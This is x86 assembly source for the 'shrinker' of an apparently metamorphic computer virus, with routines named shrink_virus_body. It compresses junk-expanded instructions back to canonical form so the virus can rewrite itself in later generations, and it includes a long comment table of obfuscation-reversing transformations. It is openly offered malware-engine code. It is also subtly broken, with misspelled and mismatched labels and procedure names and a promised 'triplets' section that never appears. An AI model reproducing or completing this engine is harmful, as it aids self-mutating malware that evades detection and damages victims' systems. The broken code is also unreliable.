
;
; shrinker
; --------
;
; required parameters:
; [InstruntionTable] = pointer to first instruction in 
; the instruction tabke
; [addressoflastinstruction] = the limit of 
; the disassembly
;
; So, this function will eliminate all the obfsucation
; done by the xpander in previous generations. The 
; compression is made by single instructions, pairs
; or triplets. The work is performed in the pseudo-
; asm lde32, so the modifications are easier
;  
; the single, pairs and triplets scanned are the following
; 
;---------------------------------------------------------------------------
;
;  Legend:
;  Reg: A register
;  Mem: A memory address
;  Imm: Immediate
;
;  When in an instruction is Reg,Reg or something like that, both are the
;  same register. If they are different, I write it as Reg,Reg2 (for example).
;
;  Transformations over single instructions:
;
;   XOR Reg,-1               --> NOT Reg
;   XOR Mem,-1               --> NOT Mem
;   MOV Reg,Reg              --> NOP
;   SUB Reg,Imm              --> ADD Reg,-Imm
;   SUB Mem,Imm              --> ADD Mem,-Imm
;   XOR Reg,0                --> MOV Reg,0
;   XOR Mem,0                --> MOV Mem,0
;   ADD Reg,0                --> NOP
;   ADD Mem,0                --> NOP
;   OR  Reg,0                --> NOP
;   OR  Mem,0                --> NOP
;   AND Reg,-1               --> NOP
;   AND Mem,-1               --> NOP
;   AND Reg,0                --> MOV Reg,0
;   AND Mem,0                --> MOV Mem,0
;   XOR Reg,Reg              --> MOV Reg,0
;   SUB Reg,Reg              --> MOV Reg,0
;   OR  Reg,Reg              --> CMP Reg,0
;   AND Reg,Reg              --> CMP Reg,0
;   TEST Reg,Reg             --> CMP Reg,0
;   LEA Reg,[Imm]            --> MOV Reg,Imm
;   LEA Reg,[Reg+Imm]        --> ADD Reg,Imm
;   LEA Reg,[Reg2]           --> MOV Reg,Reg2
;   LEA Reg,[Reg+Reg2]       --> ADD Reg,Reg2
;   LEA Reg,[Reg2+Reg2+xxx]  --> LEA Reg,[2*Reg2+xxx]
;   MOV Reg,Reg              --> NOP
;   MOV Mem,Mem              --> NOP (result of a compression of
;                                     PUSH Mem/POP Mem, with pseudoopcode 4F)
;
; The instructions that are eliminated (the ones that mean NOP) are be used
; as garbage along the executable code. Since every NOP instruction can be
; expanded (for example, MOV Reg,Reg can be set as PUSH Reg/POP Reg, and every
; PUSH and POP also can be expanded, and so on) you can't know what's garbage
; and what's not until you have compressed everything.
;
; The pairs of instructions that MetaPHOR can compress are:
;
;   PUSH Imm / POP Reg                      --> MOV Reg,Imm
;   PUSH Imm / POP Mem                      --> MOV Mem,Imm
;   PUSH Reg / POP Reg2                     --> MOV Reg2,Reg
;   PUSH Reg / POP Mem                      --> MOV Mem,Reg
;   PUSH Mem / POP Reg                      --> MOV Reg,Mem
;   PUSH Mem / POP Mem2                     --> MOV Mem2,Mem (codificated
;                                                with pseudoopcode 4F)
;   MOV Mem,Reg/PUSH Mem                    --> PUSH Reg
;   POP Mem / MOV Reg,Mem                   --> POP Reg
;   POP Mem2 / MOV Mem,Mem2                 --> POP Mem
;   MOV Mem,Reg / MOV Reg2,Mem              --> MOV Reg2,Reg
;   MOV Mem,Imm / PUSH Mem                  --> PUSH Imm
;   MOV Mem,Imm / OP Reg,Mem                --> OP Reg,Imm
;   MOV Reg,Imm / ADD Reg,Reg2              --> LEA Reg,[Reg2+Imm]
;   MOV Reg,Reg2 / ADD Reg,Imm              --> LEA Reg,[Reg2+Imm]
;   MOV Reg,Reg2 / ADD Reg,Reg3             --> LEA Reg,[Reg2+Reg3]
;   ADD Reg,Imm / ADD Reg,Reg2              --> LEA Reg,[Reg+Reg2+Imm]
;   ADD Reg,Reg2 / ADD Reg,Imm              --> LEA Reg,[Reg+Reg2+Imm]
;   OP Reg,Imm / OP Reg,Imm2                --> OP Reg,(Imm OP Imm2)
;                                                (must be calculated)
;   OP Mem,Imm / OP Mem,Imm2                --> OP Mem,(Imm OP Imm2)
;                                                (must be calculated)
;   LEA Reg,[Reg2+Imm] / ADD Reg,Reg3       --> LEA Reg,[Reg2+Reg3+Imm]
;   LEA Reg,[(RegX+)Reg2+Imm] / ADD Reg,Reg2 -> LEA Reg,[(RegX+)2*Reg2+Imm]
;   POP Mem / PUSH Mem                      --> NOP
;   MOV Mem2,Mem / MOV Mem3,Mem2            --> MOV Mem3,Mem
;   MOV Mem2,Mem / OP Reg,Mem2              --> OP Reg,Mem
;   MOV Mem2,Mem / MOV Mem2,xxx             --> MOV Mem2,xxx
;   MOV Mem,Reg / CALL Mem                  --> CALL Reg
;   MOV Mem,Reg / JMP Mem                   --> JMP Reg
;   MOV Mem2,Mem / CALL Mem2                --> CALL Mem
;   MOV Mem2,Mem / JMP Mem2                 --> JMP Mem
;   MOV Mem,Reg / MOV Mem2,Mem              --> MOV Mem2,Reg
;   OP Reg,xxx / MOV Reg,yyy                --> MOV Reg,yyy
;   Jcc @xxx / !Jcc @xxx                    --> JMP @xxx (this applies to
;                                                (Jcc & 0FEh) with (Jcc | 1)
;   NOT Reg / NEG Reg                       --> ADD Reg,1
;   NOT Reg / ADD Reg,1                     --> NEG Reg
;   NOT Mem / NEG Mem                       --> ADD Mem,1
;   NOT Mem / ADD Mem,1                     --> NEG Mem
;   NEG Reg / NOT Reg                       --> ADD Reg,-1
;   NEG Reg / ADD Reg,-1                    --> NOT Reg
;   NEG Mem / NOT Mem                       --> ADD Mem,-1
;   NEG Mem / ADD Mem,-1                    --> NOT Mem
;   CMP X,Y / != Jcc (CMP without Jcc)      --> NOP
;   TEST X,Y / != Jcc                       --> NOP
;   POP Mem / JMP Mem                       --> RET
;   PUSH Reg / RET                          --> JMP Reg
;   CALL Mem / MOV Mem2,EAX                 --> CALL Mem / APICALL_STORE Mem2
;   MOV Reg,Mem / CALL Reg                  --> CALL Mem
;   XOR Reg,Reg / MOV Reg8,[Mem]            --> MOVZX Reg,byte ptr [Mem]
;   MOV Reg,[Mem] / AND Reg,0FFh            --> MOVZX Reg,byte ptr [Mem]
;
;
; Maybe there are more, but this set is sufficient, at least for our
; proposits. What we do know is scan the code for this situations and then we
; substitute the first instruction by their equivalent and we overwrite with
; NOP the second, so the instructions are compressed.
;
; But there are more: the triplets:
;
; shrink_virus_body acts over the disassembled buffer in [InstructionTable]

;MAX_SHRINK_SIZE		equ 	7695212      ; this will come in later versions

shrink_virus_body	            proc
					
					mov 	      edi, [ebp+virii_instruc]
					mov 	      eax, [edi]
					and 	      eax, 0FFh 		            ; get pseudo-opcode
					call 	      virii_Checkinstruc 		; uses a memory address?
					or 	      eax, eax
					jz          shrink 				; if not, continue
					call 	      OrderRegs				; from lower to upper

shrink: 		            mov 	      eax, [edi]
					and 	      eax, 0FFh 		; pseudo-op
					cmp 	      eax, 0FFh		; is it nop?
					jz          IncreaseEIP		; if so, increase the pointer
					call 	      ShrinkDisInstruc ; check for singles, pairs or 
											 ; triplets
					or 	      eax, eax 		; do we performed a compressions?
					jz          IncreaseEIP		; if we dont, increase the pointer
					call 	      DecreaseEIP		; decrease the ponter three instructions
					call 	      DecreaseEIP 	; to get a possible matching group with
					call 	      DecreaseEIP		; the two above
					jmp         shrink

IncreaseEIP:
					call 	      IncreaseEIP		; increase the pointer
					cmp 	      edi, [epb+virii_addr0flast] ; last instruction?
					jnz         shrink

decreaseAddr:				      		      ; Decrease Address of last Instruction
					sub 	      edi, 10h 		; now we can eliminate the remaining NOPs
					mov 	      eax, [edi] 		; at the end of all of the instructions.
					and 	      eax, 0FFh
					cmp 	      eax, 0FFh
					jnz         LastInstructionOK
					mov 	      [ebp+virii_addr0flast], edi
					jmp         decreaseAddr

LastInstructionOK:

 	; second pass to find APICALL_BEGIN, APICALL_END and SET_WEIGHT
 					mov 	edi, [ebp+virii_instruc]

FindAPICALL_X:
GetFirstInstru:
 					call 	      IncreaseEIP2 			; increase pointer
 					cmp 	      eax, -1				; end of the instruction table?
 					jz          EndOfScan				; if so, finish the search

 					mov 	      eax, [edi]
 					and 	      eax, 0FFh
 					cmp 	      eax, 50h
 					jz          ItsNot_Set_weight
 					push 	      edi
 					mov 	      esi, edi

 					call 	      IncreaseEIP2
 					or 		eax, eax
 					jnz         ItsNot_Set_weight_2
 					mov 	      eax, [edi]
 					and 	      eax, 0FFh
 					cmp 	      eax, 40h
 					jz          ItsNot_Set_weight_2
 					mov 	      edx, edi

 					call 	      IncreaseEIP2
 					or 	      eax, eax
 					jnz         ItsNot_Set_weight_2
 					mov 	      eax, [edi]
 					and 	      eax, 0FFh
 					cmp 	      eax, 40h
 					jnz         ItsNot_Set_weight_2
 					mov 	      ecx, edi

 					call 	      IncreasaeEIP2
 					or 	      eax, eax
 					jnz         ItsNot_Set_weight_2
 					mov 	      eax, [edi]
 					and 	      eax, 0FFh
 					cmp 	      eax, 58h
 					jnz         ItsNot_Set_weight_2

 					mov 	      eax, [esi+1]
 					and 	      eax, 0FFh
 					mov 	      esi, eax
 					mov 	      eax, [edx+1]
 					and         eax, 0FFh
 					cmp   	eax, esi
 					jnz         ItsNot_Set_weight_2
 					mov   	eax, [edi+1]
 					and 	      eax, 0FFh
 					cmp 	      eax, esi
 					jnz         ItsNot_Set_weight_2
 					mov 	      esi, [ecx+1]
 					and 	      esi, 0FFh
 					mov 	      eax, [ebx+7]
 					and 	      eax, 0FFh
 					cmp 	      eax, esi
 					jnz         ItsNot_Set_weight_2
 					pop 	      esi
 					mov   	eax, 0F7h 				; set_weight
 					mov 	      [esi], al
 					mov    	eax, [esi+1]
 					mov 	      [esi+9], al
 					mov 	      eax, [ebx+1]
 					mov 	      [esi+1], eax
 					mov 	      eax, [ebx+3]
 					mov         [esi+3], eax
                	            mov         eax, [edx+7]
               	            mov         [esi+7], al
               	            mov          eax, [ecx+1]
                	            mov         [esi+8], al
                	            mov         eax, 0FFh
                	            mov         [edx], eax
                	            mov         [ecx], eax
                	            mov         [ebx], eax
                	            mov         [edi], eax
                	            jmp         AllOK
ItsNot_SET_WEIGHT_2:
                	            pop         edi
ItsNot_SET_WEIGHT:
AllOK:

CheckAPI_X:
  					mov 	      edx, edi 			; save the pointer in EDX
  					push 	      edi

  GetSecondInstruc:
  					call 	      IncreaseEIP2 		; get next
  					cmp 	      eax, -1 			; end of the code?
  					jz          EndOfScan 			; finish it, then!
  					or 	      eax, eax 			; label over the instruction?
  					jnz         EndOfTriplet 		; if there is a label, ignore the group
  					mov 	      esi, edi 			; put the pointer in ESI

  GetThirdInstruc:
                              call        IncreaseEIP2 ; Do the same: increase pointer and check
                              cmp         eax, -1      ; for end of code or a label over the
                              jz          EndOfScan    ; instruction
                              or          eax, eax
                              jnz         EndOfTriplet

                              mov         eax, [edx]   ; Get the first instruction
                              and         eax, 0FFh
                              cmp         eax, 50h     ; PUSH Reg?
                              jnz         FindAPICALL_END ; If not, check next instruction
                              mov         eax, [esi]   ; Get the second instruction
                              and         eax, 0FFh
                              cmp         eax, 50h     ; PUSH Reg?
                              jnz         FindAPICALL_END ; If not, next instruction
                              mov         eax, [edi]   ; Get the third instruction
                              and         eax, 0FFh
                              cmp         eax, 50h     ; PUSH Reg?
                              jnz         FindAPICALL_END ; If not, next instruction
                              mov         eax, [edx+1]
                              and         eax, 0FFh
                              or          eax, eax     ; First instruction is PUSH EAX?
                              jnz         FindAPICALL_END ; If it isn't, it's not APICALL_*
                              mov         eax, [esi+1]
                              and         eax, 0FFh
                              cmp         eax, 1       ; Is it PUSH ECX?
                              jnz         FindAPICALL_END ; If not, check other
                              mov         eax, [edi+1]
                              and         eax, 0FFh
                              cmp         eax, 2       ; Is it PUSH EDX
                              jnz         FindAPICALL_END ; If not, check other
                              mov         eax, 0F4h    ; APICALL_BEGIN
 SetAPICALL_X:
                              mov         [edx], eax   ; Set instruction
                              mov         eax, 0FFh
                              mov         [esi], eax   ; NOP the second and third instruction
                              mov         [edi], eax
                              jmp         EndOfTriplet ; Check next group

 FindAPICALL_END:
                              mov         eax, [edx]   ; Get the first instruction
                              and         eax, 0FFh
                              cmp         eax, 58h     ; POP Reg?
                              jnz         EndOfTriplet ; If not, next group
                              mov         eax, [esi]   ; Check the second instruction
                              and         eax, 0FFh
                              cmp         eax, 58h     ; POP Reg?
                              jnz         EndOfTriplet ; If not, next group
                              mov         eax, [edi]   ; Get the third instruction
                              and         eax, 0FFh
                              cmp         eax, 58h     ; POP Reg?
                              jnz         EndOfTriplet ; If not, next group
                              mov         eax, [edx+1]
                              and         eax, 0FFh
                              cmp         eax, 2       ; First instruction = POP EDX?
                              jnz         EndOfTriplet ; If not, check next group
                              mov         eax, [esi+1]
                              and         eax, 0FFh
                              cmp         eax, 1       ; Second instruction = POP ECX?
                              jnz         EndOfTriplet ; If not, check next group
                              mov         eax, [edi+1]
                              and         eax, 0FFh
                              or          eax, eax     ; Third instruction = POP EAX?
                              jnz         EndOfTriplet ; If not, check next group
                              mov         eax, 0F5h    ; Set APICALL_END
                              jmp         SetAPICALL_X

EndOfTriplet:
                              pop         edi          ; Restore pointer and check next triplet
                              jmp         FindAPICALL_X

EndOfScan:
                              pop         edi
                              ret

shrink_virus_body	            endp

; this function is used while we scan for APICALL_BEGIN and APICALL_END

IncreaseEIP2 		      proc

				      cmp 	edi, [ebp+virii_addr0flast]
				      jz    @@EndOfScan
				      add 	edi, 10h 				; increase the instruction pointer
				      cmp 	edi, [ebp+virii_addr0flast]
				      jz    @@EndOfScan 			; if we finished the code, return -1
				      mov 	eax, [edi]				; get the instruction
				      and 	eax, 0FFh
				      cmp 	eax, 0FFh 				; if its nop, increase again
				      jz 	IncreaseEIP2
				      mov 	eax, [edi+0Bh] 			; get the label flag
				      and 	eax, 0FFh 				; return 1 if the instruction has a 
				      ret 						; label pointing to it or 0 if it does not have it
	@@EndOfScan:
				      mov 	eax, -1
				      ret

IncreaseEIP2 		      endp

; this function that decreases the instruction pointer. It will then decrease while
; the instruction nop, unless it is the first or it is labeled.

DecreaseEIP 		      proc

	Again: 		      cmp 	  edi, [ebp+virii_instruc] 		; if we are just at the 
                              jz 	  Ok 					      ; beginning, return
                              mov 	  eax, [edi+0Bh]				; check label
                              and 	  eax, 0FFh					; if the current instruction is labelled,
                              or 	  eax, eax 					; finish the decreasing
                              jnz     Ok
                              sub 	  edi, 10h 					; now decrease the pointer
                              mov     eax, [edi]
                              and 	  eax, 0FFh
                              cmp 	  eax, 0FFh 					; is it nop?
                              jz 	  Again 					; if it is, decrease again
	Ok:	                  ret

DecreaseEIP 		      endp

; this function increases the instruction pointer, it will increase until
; the current instruction is not a NOP or it is the last instruction of the code.

IncreaseEIP 		       proc

					 mov 	      ecx, [ebp+virii_addr0flast] 
					 cmp 	      edi, ecx 						; pointing to the last instruction?
					 jz         _end 							; if so, end
Again:                         add 	      edi, 10h 						; check next
					 cmp 	      edi, ecx 						; last instruction?
					 jz         _end 							; if so, end
					 mov 	      eax, [edi+0Bh] 					; check if its labelled
					 and 	      eax, 0FFh						
					 or 	      eax, eax 						; if its labelled, end increasing
					 jnz        end 						
					 mov 	      eax, [edi] 						; get the instruction
					 and 	      eax, 0FFh 
					 cmp 	      eax, 0FFh 						; if its np, increase again
					 jz         Again 
End:	                         mov 	      eax, [edi]
					 and 	      eax, 0FFh 						; check if the instruction use a 
					 call       virii_Checkinstruc 				; memory address
					 or 	      eax, eax
					 jz         _end
					 call       OrderRegz 						; if it uses a memory address, order the 
					 									; indexes
					 mov 	      eax, [edi] 						; checks if the instruction is MOV Mem,Mem
					 and 	      eax, 0FFh
					 cmp 	      eax, 4Fh
					 jnz        _end
					 push       edi 							; if its MOV Mem,Mem, order the indexes
					 mov 	      edi, [edi+7] 					; of the extended part
					 call       OrderRegz
					 pop 	      edi
_end:                          ret

IncreaseEIP 		       endp

; this function now is ordering the indexes in an instruction that uses a memory address.
; if it  has a single index, it is set at +1 (since the disassembler may put it at +2 and 
; set at 8 value in +1). If it has a multiplicator, just leave it at +2. If the instruction
; has two indexes with no mutiplicators, put the lower one at +1 and other at +2. In case
; that the one at +2 has a multiplicator, the indexes are unexchanged.

OrderRegz 			      proc
					
					push 	      edx
					mov 	      eax, [edi+1] 				; check the index
					and 	      eax, 0FFh
					cmp 	      eax, 8 					; if it does not exists, check the 
					jnz         _next 					; second index
					mov   	eax, [edi+2] 				; get the second index
					and 	      eax, 0FFh 
					cmp 	      eax, 7 					; if it has a scalar modification (*2,
					jb          _end 						; *4 or *8) just leave it alone.
									                  ; so at this point, +1 is free and +2 holds an index
					mov 	      edx, [edi+1] 				; put the index at +1
					and 	      edx, 0FFFFFF00h
					add 	      eax, edx
					mov 	      [edi+1], eax 
					mov 	      eax, [edi+2] 				; free the position at +2
					and 	      eax, 0FFFFFF00h
					add 	      eax, 8
					mov 	      [edi+2], eax 
_end:                         pop 	      edx 						; return
					ret
								      	; so at this point, we put the lowest at +1. +1 is sure to hold
							      		; a register, so +2 holds another one, 8 (no one) or one with
						      			; multiplicator. In all cases, we can check for the lowest 
						      			; number and put it at +1 and we are ordering them (since a
							      		; free position at +2 would be 8, which is always > [-1] or
							      		; would use a scalar, so it would be >=40h)
_next:	                  mov 	      eax, [edi+2] 	; get the two indexes
					mov 	      edx, [edi+1]
					and 	      eax, 0FFh
					and 	      edx, 0FFh
					cmp   	eax, edx 					; So IF EAX > EDX, they are already ordered
					jb          _end
					push 	      eax
					mov 	      edx, [edi+2] 				; get the lowest at +2 in EDX
					mov 	      eax, [edi+1] 				; get the highest at +1 in EAX
					and 	      eax, 0FFh 
					and  	      edx, 0FFFFFF00h
					add 	      eax, edx 					; combine the data 
					mov 	      [edi+2], eax 				; set the register at +2
					pop 	      eax
					mov 	      edx, [edi+1] 				; get the DWORD at +1 (keep all of the info)
					and 	      edx, 0FFFFFF00h
					add 	      eax, edx 					; merge it with the lowest register
					mov 	      [edi+1], eax 				; set it at +1
					pop 	      edx
					ret 								; return with the indexes ordered

OrderRegz 			      endp

; EDI = Instruction pointer
; ECX = Address of last instruction
; returns:
; EAX != 0 if compressed, EAX = 0 if left unchanged
ShrinkThisInstructions  proc
;;; Single instructions. The instructions are converted to their equivalent
;;; from the obfuscated form. In this way we also make easier the search of
;;; pairs and triplets.
                	            push        edi
Check_Single:
                	            mov         eax, [edi]
                	            and         eax, 0FFh
                	            cmp         eax, 30h      ; Check XOR Reg,Imm
                	            jnz         Single_Next00
                	            mov         ecx, 0E0h     ; Maybe it's NOT Reg
Single_Next_CommonXOR_s1:
                	            mov         eax, [edi+7]  ; Get the Imm
Single_Next_CommonXOR_s1_2:
                	            cmp         eax, -1       ; Check if it's -1
                	            jz          Single_SetInstructionECX ; If it is, set opcode <ECX>
Single_Next_CheckNulOP:
                	            or          eax, eax      ; Check if it's XOR with 0
                	            jnz         Single_End
                	            jmp         Single_SetNOP ; If it's 0, set a NOP
Single_SetInstructionECX:
                	            mov         eax, ecx      ; Set the opcode in <ECX>
                	            jmp         Single_SetInstruction

Single_Next00:
                	            ;mov        al, [edi]
                	            cmp         eax, 34h       ; Check XOR Mem,Imm
                	            jnz         Single_Next00_
                	            mov         ecx, 0E1h      ; Set NOT Mem if Imm == -1
                	            jmp         Single_Next_CommonXOR_s1

Single_Next00_:
                	            cmp         eax, 4Bh       ; Check TEST Mem,Reg
                	            jnz         Single_Next00__
                	            mov         eax, 4Ah       ; If it is, set TEST Reg,Mem (the other
                	            jmp         Single_SetInstruction ; possibility doesn't exist)

Single_Next00__:
                	            cmp         eax, 4Bh+80h  ; Check TEST Mem,Reg (8 bits)
                	            jnz         Single_Next01
                	            mov         eax, 4Ah+80h  ; It it is, set TEST Reg,Mem (8 bits)
                	            jmp         Single_SetInstruction

Single_Next01:
                	            ;mov        al, [edi]
                	            cmp         eax, 30h+80h   ; XOR Reg8,Imm8?
                	            jnz         Single_Next02
                	            mov         ecx, 0E2h      ; Set NOT if Imm8 == -1
Single_Next01_GetSigned:
                              mov         eax, [edi+7]
                              and         eax, 0FFh
                              cmp         eax, 80h
                              jb          Single_Next01_NotSigned
                              add         eax, 0FFFFFF00h
Single_Next01_NotSigned:
                              jmp   Single_Next_CommonXOR_s1_2

Single_Next02:
                              ;mov        al, [edi]
                              cmp         eax, 34h+80h   ; XOR Mem8,Imm8?
                              jnz         Single_Next03
                              mov         ecx, 0E3h      ; Set NOT if Imm8 == -1
                              jmp         Single_Next01_GetSigned

Single_Next03:
                              ;mov        al, [edi]
                              cmp         eax, 41h        ; MOV Reg,Reg?
                              jnz         Single_Next04
Single_Next_CommonMOV:
                              mov         eax, [edi+1]    ; Check if source and destiny are
                              mov         ecx, [edi+7]    ; the same
                              and         eax, 0FFh
                              and         ecx, 0FFh
                              cmp         eax, ecx        ; If they are, set NOP
                              jnz         Single_End
Single_SetNOP:
                	            mov         eax, 0FFh
Single_SetInstruction:
                              mov         ecx, [edi]      ; Get the DWORD at [EDI]
                              and         ecx, 0FFFFFF00h
                              and         eax, 0FFh       ; Set 0FF on the lower byte (set NOP)
                              add         eax, ecx
                              mov         [edi], eax      ; Write back the DWORD
                              jmp         EndCompressed

Single_Next04:
                	            ;mov        al, [edi]
                	            cmp         eax, 41h+80h   ; MOV Reg8,Reg8?
                	            jz          Single_Next_CommonMOV

Single_Next05:
                	            ;mov        al, [edi]
                	            cmp         eax, 28h        ; SUB Reg,Imm?
                	            jnz         Single_Next06
                	            xor         ecx, ecx        ; Just put ADD
Single_Next_NegateImm:
                	            mov         eax, [edi+7]    ; Negate the Imm
                	            neg         eax
                	            mov         [edi+7], eax
                	            jmp         Single_SetInstructionECX ; Set the opcode of ADD

Single_Next06:
                	            ;mov        al, [edi]
                              cmp         eax, 28h+80h   ; SUB Reg8,Imm8?
                              jnz         Single_Next07
                              mov         ecx, 00h+80h   ; Set the opcode of ADD Reg8,Imm8
                              jmp         Single_Next_NegateImm ; Jump to negate the Imm

Single_Next07:
                              ;mov        al, [edi]
                              cmp         eax, 2Ch       ; SUB Mem,Imm?
                              jnz         Single_Next08
                              mov         ecx, 04h       ; Set ADD Mem,-Imm
                              jmp         Single_Next_NegateImm

Single_Next08:
                              ;mov        al, [edi]
                              cmp         eax, 2Ch+80h   ; SUB Mem8,Imm8?
                              jnz         Single_Next09
                              mov         ecx, 04h+80h   ; Set ADD Mem8,-Imm8
                              jmp         Single_Next_NegateImm

Single_Next09:
                              ;mov        al, [edi]
                              or          eax, eax       ; ADD Reg,Imm?
                              jnz         Single_Next10
Single_Next_CheckNulOP_2:
                              mov         eax, [edi+7]   ; Check if it's ADD Reg,0. If it is,
                              jmp         Single_Next_CheckNulOP  ; anulate the instruction

Single_Next10:
                              cmp         eax, 4                      ; ADD Mem,Imm?
                              jz          Single_Next_CheckNulOP_2 ; If it is, check for Imm==0
                              cmp         eax, 04h+80h                ; ADD Mem8,Imm8?
                              jz          Single_Next_CheckNulOP_2_8b ; Check for Imm8 == 0
                              cmp         eax, 0Ch                    ; OR Mem,Imm?
                              jz          Single_Next_CheckNulOP_2    ; Check for Imm == 0
                              cmp         eax, 0Ch+80h                ; OR Mem8,Imm8?
                              jz          Single_Next_CheckNulOP_2_8b ; Check for Imm8 == 0
                              cmp         eax, 24h+80h               ; AND Mem8,Imm8?
                              jz          Single_Next10_Check_s1_8b  ; Check for Imm8 == -1 or 0
                              cmp         eax, 24h                   ; AND Mem,Imm?
                              jnz         Single_Next10_             ; Check for Imm == -1 or 0
Single_Next10_Check_s1:
                              mov         eax, [edi+7]   ; Get Imm
                              cmp         eax, -1
                              jz          Single_SetNOP  ; If Imm == -1, set NOP
                              or          eax, eax
                              jnz         Single_End     ; If Imm == 0,
                              mov         eax, 44h       ;  set MOV Mem,0
                              jmp         Single_SetInstruction
Single_Next10_Check_s1_8b:
                              mov         eax, [edi+7]
                              and         eax, 0FFh
                              cmp         eax, 0FFh     ; Check if Imm8 == -1
                              jz          Single_SetNOP ; If it is, set NOP
                              or          eax, eax      ; Check if Imm8 == 0
                              jnz         Single_End    ; If it isn't, check doubles
                              mov         eax, 44h+80h  ; Set MOV Mem8,0
                              jmp         Single_SetInstruction


Single_Next10_:
                              ;mov        al, [edi]
                              cmp         eax, 00h+80h   ; ADD Reg8,Imm8?
                              jnz         Single_Next11
Single_Next_CheckNulOP_2_8b:
                              ;xor        eax, eax
                              mov         eax, [edi+7]   ; Get the Imm and go to check if it's 0
                              and         eax, 0FFh
                              jmp         Single_Next_CheckNulOP

Single_Next11:
                              ;mov        al, [edi]
                              cmp         eax, 08h       ; OR Reg,Imm?
                              jz          Single_Next_CheckNulOP_2  ; Check if Imm is 0

Single_Next12:
                            	;mov        al, [edi]
                            	cmp         eax, 08h+80h   ; OR Reg8,Imm8?
                           	jz          Single_Next_CheckNulOP_2_8b  ; Check if is 0

Single_Next13:
                              ;mov        al, [edi]
                              cmp         eax, 20h       ; AND Reg,Imm?
                              jnz         Single_Next14
                              mov         eax, [edi+7]   ; Check if Imm == -1
                              cmp         eax, -1
                              jz          Single_SetNOP  ; If it is, set NOP
                              or          eax, eax
                              jnz         Single_End
                              mov         eax, 40h       ; If it's 0, set MOV Reg,0
                              jmp         Single_SetInstruction

Single_Next14:
                              ;mov        al, [edi]
                              cmp         eax, 20h+80h   ; AND Reg8,Imm8?
                              jnz         Single_Next15
                              mov         eax, [edi+7]   ; Get Imm8
                              and         eax, 0FFh
                              cmp         eax, 0FFh      ; Check if it's -1
                              jz          Single_SetNOP  ; If it is, set NOP
                              or          eax, eax
                              jnz         Single_End     ; Check if it's 0
                              mov         eax, 40h+80h   ; If it is, set MOV Reg,0
                              jmp         Single_SetInstruction

Single_Next15:
                              ;mov        al, [edi]
                              cmp         eax, 31h       ; XOR Reg,Reg?
                              jnz         Single_Next16
Single_Next_CheckSetTo0:
                	            mov         ecx, 40h       ; Set ECX = pseudoopcode of MOV
Single_Next_CheckSetTo0_2:
                              mov         eax, [edi+1]   ; Check if source == destiny
                              mov         ebx, [edi+7]
                              and         eax, 0FFh
                              and         ebx, 0FFh
                              cmp         eax, ebx       ; If they are equal...
                              jnz         Single_End     ; ...
                              xor         eax, eax       ; ...set MOV Reg,0
                              mov         [edi+7], eax
                              jmp         Single_SetInstructionECX

Single_Next16:
                              ;mov        al, [edi]
                              cmp         eax, 31h+80h   ; XOR Reg8,Reg8?
                              jnz         Single_Next17
Single_Next_CheckSetTo0_8b:
                              mov         ecx, 40h+80h   ; Check if source == destiny and put
                              jmp         Single_Next_CheckSetTo0_2 ; MOV Reg8,0 if they are
                                                            ; equal
Single_Next17:
                              ;mov        al, [edi]
                              cmp         eax, 29h       ; SUB Reg,Reg?
                              jz          Single_Next_CheckSetTo0 ; Check in the same way as
                                                            ; XOR Reg,Reg
Single_Next18:
                              ;mov        al, [edi]
                              cmp         eax, 29h+80h   ; SUB Reg8,Reg8?
                              jz          Single_Next_CheckSetTo0_8b  ; Check if src == dest, to
                                                            ; see if we put MOV Reg8,0

Single_Next19:
                              ;mov        al, [edi]
                              cmp         eax, 09h       ; OR Reg,Reg?
                              jnz         Single_Next20
Single_Next_CheckCheckIf0:
                              mov         ecx, 38h       ; Put CMP Reg,0 if src == dest
                              jmp         Single_Next_CheckSetTo0_2

Single_Next20:
                              ;mov        al, [edi]
                              cmp         eax, 09h+80h   ; OR Reg8,Reg8?
                              jnz         Single_Next21
Single_Next_CheckCheckIf0_8b:
                              mov         ecx, 38h+80h   ; Put CMP Reg8,0 if src == dest
                              jmp         Single_Next_CheckSetTo0_2

Single_Next21:
                              ;mov        al, [edi]
                              cmp         eax, 21h       ; AND Reg,Reg?
                              jz          Single_Next_CheckCheckIf0

Single_Next22:
                              ;mov        al, [edi]
                              cmp         eax, 21h+80h   ; AND Reg8,Reg8?
                              jz          Single_Next_CheckCheckIf0_8b

Single_Next23:
                              ;mov        al, [edi]
                              cmp         eax, 49h       ; TEST Reg,Reg?
                              jz          Single_Next_CheckCheckIf0

Single_Next24:
                              ;mov        al, [edi]
                              cmp         eax, 49h+80h   ; TEST Reg8,Reg8?
                              jz          Single_Next_CheckCheckIf0_8b

Single_Next25:
                              ;mov        al, [edi]
                              cmp         eax, 0FCh      ; LEA Reg,[Mem]?
                              jnz         Single_Next26
                              mov         eax, [edi+2]   ; Check second index
                              and         eax, 0FFh
                              cmp         eax, 40h       ; If it has a multiplicator, it's not
                              jae         Single_Next26  ; interesting
                              mov         eax, [edi+1]   ; Now +1 holds the first index (and if
                              and         eax, 0FFh      ; there aren't multiplicators, this
                              cmp         eax, 8         ; must be < 8 if there is an index)
                              jz          Single_Next_LEA_CheckMOV ; If 8, there aren't indexes
                              mov         ecx, [edi+7]
                              and         ecx, 0FFh      ; ECX = Destiny register
                              cmp         eax, ecx       ; Are they equal?
                              jz          Single_Next_LEA_CheckADD ; If so, check ADD
                              mov         eax, [edi+2]   ; Get the second index
                              and         eax, 0FFh      ; Is there anyone?
                              cmp         eax, 8
                              jz          Single_Next_LEA_CheckMOVRegReg ; If not, check MOV
                              cmp         eax, ecx                  ; Is equal to the destiny?
                              jz          Single_Next_LEA_CheckADDRegReg2 ; If so, check ADD
                              mov         ecx, [edi+1]   ; Get the first index
                              and         ecx, 0FFh
                              cmp         eax, ecx       ; If it's not equal to the second,
                              jnz         Single_End     ; finish singles conversion
                              mov         eax, 8         ; Set the first index as 8
                              mov         ecx, [edi+1]
                              and         ecx, 0FFFFFF00h
                              add         eax, ecx
                              mov         [edi+1], eax
                              mov         eax, [edi+2]
                              add         eax, 40h       ; Set LEA Reg,[2*Reg]
                              mov         [edi+2], eax
                              jmp         EndCompressed  ; End with compression flag 
Single_Next_LEA_CheckADDRegReg2:
                              mov         eax, [edi+3]   ; Get the immediate
                              or          eax, eax       ; If it's 0, set ADD Reg,Reg
                              jz          Single_Next_LEA_SetADDRegReg_2 ; If not, leave LEA
                              jmp         Single_End
Single_Next_LEA_CheckMOV:
                              mov         eax, [edi+2]   ; It DOESN'T hold anything more than
                              and         eax, 0FFh      ; 8, but just in case
                              cmp         eax, 8
                              jz          Single_Next_LEA_SetMOV ; If 8, set MOV Reg,Imm
